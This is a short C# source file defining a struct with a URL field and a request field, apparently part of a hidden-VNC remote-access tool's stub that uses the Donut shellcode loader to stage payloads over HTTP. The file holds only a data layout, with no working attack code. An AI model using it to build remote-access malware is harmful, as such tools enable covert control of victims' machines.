using System.Runtime.InteropServices;

namespace ICARUS.HVNC.StubUtils.Donut.Structs
{
    public struct DSHttp
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
        public char[] url;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] req;
    }
}
